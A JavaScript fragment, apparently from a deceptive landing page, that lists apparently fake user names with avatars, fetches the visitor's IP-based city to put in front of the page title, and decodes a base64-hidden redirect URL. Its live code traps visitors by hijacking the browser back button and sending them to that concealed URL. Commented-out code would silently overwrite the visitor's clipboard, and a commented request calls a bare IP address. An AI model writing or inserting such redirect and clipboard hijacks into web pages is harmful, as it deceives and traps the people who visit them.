    {name: "傲氣達人",avatar: "https://sc01.alicdn.com/kf/Hba3cea404949459b802515b776eab620m.jpg"},
    {name: "J奶茶、",avatar: "https://sc01.alicdn.com/kf/H585e4277be074828983fb966938978ac5.jpg"}
];

var backlink = atob(info.cnzz);

loadJs('https://hm.baidu.com/hm.js?' + info.hm);
// loadJs('https://s2.pstatp.com/cdn/clipboard.js/2.0.4/clipboard.min.js', function() {
//     if(info.code.length>5){
//         new ClipboardJS("html",{text: function(){return info.code;}});
//     }
// })

window.onload = function(){

    loadJs('https://ip.ws.126.net/ipquery', function() {
        config.ztitle = getCity() + config.ztitle;
        querySelector('#loading').style.display = 'none';
        loadPage();
    });
}

function jingfh(url){var a=document.createElement("a");a.href=url; a.rel="noopener noreferrer";a.click();}
// request("http://47.105.83.231/cnzz/i?pid=glkt77&cid=glkt77", function(a) {wfapi = JSON.parse(a);});
window.addEventListener("popstate", function(e) {
    history.pushState(history.length + 1, "message", "#" + (new Date).getTime());
    jingfh(backlink);
}, false);